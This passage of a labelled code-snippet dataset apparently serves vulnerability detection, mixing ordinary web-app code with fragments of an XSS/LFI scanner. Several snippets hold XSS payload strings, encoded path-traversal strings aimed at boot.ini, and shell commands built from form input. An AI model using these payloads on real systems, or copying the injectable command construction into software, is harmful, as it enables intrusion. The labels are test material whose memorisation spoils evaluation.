36618, "code": "( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed", "label": 0}, {"snippet_id": 4921, "code": " onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>'", "label": 0}, {"snippet_id": 20271, "code": " pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property", "label": 0}, {"snippet_id": 42278, "code": ".doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal", "label": 0}, {"snippet_id": 7362, "code": "),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import", "label": 0}, {"snippet_id": 35947, "code": "\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype", "label": 0}, {"snippet_id": 40231, "code": "\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in", "label": 0}, {"snippet_id": 5000, "code": ">Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert", "label": 0}, {"snippet_id": 47754, "code": "/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request: the HttpRequest :param default_forward_url: The URL to forward", "label": 0}, {"snippet_id": 33339, "code": "() return routes def get_backend_routes(): prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket", "label": 0}, {"snippet_id": 52500, "code": " 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node", "label": 0}, {"snippet_id": 44805, "code": " if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path", "label": 0}, {"snippet_id": 16167, "code": ".login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=", "label": 0}, {"snippet_id": 849, "code": "] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def", "label": 1}, {"snippet_id": 38008, "code": "\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t", "label": 0}, {"snippet_id": 29967, "code": "'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local\", \"users.py \texcept", "label": 0}, {"snippet_id": 12557, "code": ">[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name", "label": 0}, {"snippet_id": 52795, "code": ": request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value", "label": 0}, {"snippet_id": 26836, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params", "label": 0}, {"snippet_id": 598, "code": "=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url", "label": 0}, {"snippet_id": 4505, "code": ".replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace(\"A\", \"\u0104\", cnt) s=s.replace(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\"", "label": 0}, {"snippet_id": 20462, "code": "{'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course", "label": 0}, {"snippet_id": 37560, "code": ").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from", "label": 0}, {"snippet_id": 3858, "code": "=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload", "label": 0}, {"snippet_id": 34648, "code": "\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None:", "label": 0}, {"snippet_id": 29066, "code": "(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect", "label": 0}, {"snippet_id": 3191, "code": "\"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key", "label": 0}, {"snippet_id": 38692, "code": "\tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn", "label": 0}, {"snippet_id": 46890, "code": ") @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id", "label": 0}, {"snippet_id": 54357, "code": " cookie.config(width=30) method.grid(row=2, column=1) method.current(0) method.config(width=30) timeout.grid(row=3, column=1) timeout.config(width=30) user_agent.grid(row=4, column=1) user_agent.config", "label": 0}, {"snippet_id": 17678, "code": "'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user')", "label": 0}, {"snippet_id": 42773, "code": ": \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch", "label": 0}, {"snippet_id": 40144, "code": " get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit", "label": 0}, {"snippet_id": 24600, "code": " print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not", "label": 0}, {"snippet_id": 51180, "code": "(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources.ModelResource", "label": 0}, {"snippet_id": 38959, "code": " \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True", "label": 0}, {"snippet_id": 14223, "code": "'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES", "label": 0}, {"snippet_id": 39402, "code": ".set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d[", "label": 0}, {"snippet_id": 32779, "code": "-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot", "label": 0}, {"snippet_id": 39344, "code": "\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta", "label": 0}, {"snippet_id": 25368, "code": "(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField(forms.MultiValueField", "label": 0}, {"snippet_id": 50065, "code": "'POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self, failure, csessid, request): \"callback if a request is lost/timed out\" try", "label": 0}, {"snippet_id": 28143, "code": ".get_user_name_by_uuid(user_id.value) \tservers=sql.get_dick_permit() \ttoken=sql.get_token(user_id.value) \trole=sql.get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var", "label": 0}, {"snippet_id": 47255, "code": " db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view') detail_view_url=url_for( 'recordmetadata.details_view", "label": 0}, {"snippet_id": 14740, "code": "=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 2689, "code": ", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable", "label": 0}, {"snippet_id": 55048, "code": " of translations. Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view are defined in `models.BatchActionsForm`. \"\"\" form=forms.BatchActionsForm(request.POST) if not form.is_valid(", "label": 0}, {"snippet_id": 28261, "code": "(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg", "label": 0}, {"snippet_id": 27071, "code": " as f: f.write(r.content) for lfi_result in lfi_expect: if r.content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def", "label": 1}, {"snippet_id": 23869, "code": " test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self", "label": 0}, {"snippet_id": 15293, "code": "*kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir',", "label": 0}, {"snippet_id": 28108, "code": " import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage", "label": 1}, {"snippet_id": 12903, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 20872, "code": "/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 12947, "code": ": urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\")", "label": 0}, {"snippet_id": 43679, "code": ") \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value", "label": 0}, {"snippet_id": 30794, "code": "\": \timport glob \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('/show_compare_configs.html') \tleft=form.getvalue", "label": 1}, {"snippet_id": 30699, "code": ".get_setting('haproxy_sock') \tenable=form.getvalue('servaction') \tbackend=form.getvalue('servbackend')\t \tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable", "label": 0}, {"snippet_id": 54130, "code": "(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title", "label": 0}, {"snippet_id": 41290, "code": "\treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog", "label": 0}, {"snippet_id": 2295, "code": "\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info", "label": 0}, {"snippet_id": 14835, "code": " test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}", "label": 0}, {"snippet_id": 3386, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload", "label": 0}, {"snippet_id": 51396, "code": "://docs.djangoproject.com/en/2.1/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from", "label": 0}, {"snippet_id": 21187, "code": "+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url", "label": 0}, {"snippet_id": 10933, "code": ".py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We", "label": 0}, {"snippet_id": 13931, "code": "]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 45957, "code": "\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,", "label": 0}, {"snippet_id": 14641, "code": "'node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD", "label": 0}, {"snippet_id": 35802, "code": "}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self", "label": 0}, {"snippet_id": 8191, "code": "'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib", "label": 0}, {"snippet_id": 9323, "code": "/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard", "label": 0}, {"snippet_id": 55071, "code": ".as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count", "label": 1}, {"snippet_id": 3651, "code": ": xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method", "label": 0}, {"snippet_id": 28112, "code": "=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=", "label": 1}, {"snippet_id": 13811, "code": "', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 52107, "code": "() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch", "label": 0}, {"snippet_id": 37850, "code": " find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category'", "label": 0}, {"snippet_id": 19778, "code": " collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning", "label": 0}, {"snippet_id": 15906, "code": "'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self", "label": 0}, {"snippet_id": 372, "code": ",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 1}, {"snippet_id": 47477, "code": "> 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content", "label": 0}, {"snippet_id": 19332, "code": "=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name", "label": 1}, {"snippet_id": 24280, "code": " import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"", "label": 0}, {"snippet_id": 36279, "code": "(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get", "label": 0}, {"snippet_id": 36418, "code": "() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname", "label": 0}, {"snippet_id": 26148, "code": ".settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required", "label": 0}, {"snippet_id": 27966, "code": " import datetime from config import local_config from handlers import base_handler from libs import auth from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS=14", "label": 0}, {"snippet_id": 42483, "code": "\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: ", "label": 0}, {"snippet_id": 54901, "code": ".base.utils import( require_AJAX, readonly_exists, ) from pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources", "label": 0}, {"snippet_id": 5736, "code": "/xss/)</scriscriptpt>', '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '", "label": 0}, {"snippet_id": 45771, "code": "=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) },", "label": 0}, {"snippet_id": 23060, "code": ".get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 36637, "code": "/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 52568, "code": ".split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads", "label": 0}, {"snippet_id": 41314, "code": " Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull", "label": 0}, {"snippet_id": 15798, "code": ".save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded,", "label": 0}, {"snippet_id": 50198, "code": " request.finish() del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"", "label": 0}, {"snippet_id": 20057, "code": "\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and", "label": 0}, {"snippet_id": 33590, "code": "(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated", "label": 0}, {"snippet_id": 24166, "code": "-pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual(", "label": 0}, {"snippet_id": 42371, "code": " frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df", "label": 0}, {"snippet_id": 41528, "code": ".format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:", "label": 0}, {"snippet_id": 22314, "code": "<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete", "label": 0}, {"snippet_id": 5165, "code": " return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload):", "label": 0}, {"snippet_id": 27721, "code": " self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self", "label": 0}, {"snippet_id": 27918, "code": " requires 'str' but url might be an unicode string.\"\"\" super(Handler, self).redirect(str(url), **kwargs) class GcsUploadHandler(Handler): \"\"\"A handler which uploads files to GCS.\"\"\" def __init__(self, request,", "label": 1}, {"snippet_id": 48095, "code": " chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /", "label": 0}, {"snippet_id": 14, "code": " utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd()", "label": 0}, {"snippet_id": 35558, "code": " _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df", "label": 0}, {"snippet_id": 43374, "code": ") \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field", "label": 0}, {"snippet_id": 5488, "code": "'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head", "label": 0}, {"snippet_id": 3780, "code": " body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 0}, {"snippet_id": 6553, "code": "') @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/", "label": 0}, {"snippet_id": 53635, "code": "()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord", "label": 0}, {"snippet_id": 6682, "code": "): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'signup_link') @property def dashboard_link(self): \"\"\" URL(string) for use in simple templating of", "label": 0}, {"snippet_id": 2488, "code": " decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body", "label": 0}, {"snippet_id": 28435, "code": "%d' \tif type==\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path", "label": 0}, {"snippet_id": 24222, "code": ".imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir", "label": 0}, {"snippet_id": 29625, "code": " stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"", "label": 0}, {"snippet_id": 5072, "code": ":alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ]", "label": 0}, {"snippet_id": 35193, "code": "\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif 